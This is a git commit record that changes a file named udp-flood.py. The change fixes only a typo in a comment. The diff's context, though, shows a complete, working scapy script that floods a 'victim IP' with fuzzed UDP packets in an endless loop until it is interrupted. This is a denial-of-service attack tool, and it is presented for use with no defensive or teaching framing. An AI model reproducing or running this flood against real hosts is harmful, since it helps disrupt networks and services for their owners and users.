a2ea7baf7a6e7bb570aa0072014af1337e44925c
za-sec <eremeevvanya1@gmail.com>
2020-11-11 03:44:36 +0300

    Update udp-flood.py

--- udp-flood.py
+++ udp-flood.py
@@ -2,4 +2,4 @@ from scapy.all import *
 
 payload = 'a' * 100 # any payload with 100+ length
 
-send(IP(dst="192.168.1.108")/fuzz(UDP()/payload),loop=1) # send udp packets to victim IP till script turn off by Ctrl+C
+send(IP(dst="192.168.1.108")/fuzz(UDP()/payload),loop=1) # send udp packets to victim IP till script turns off by Ctrl+C
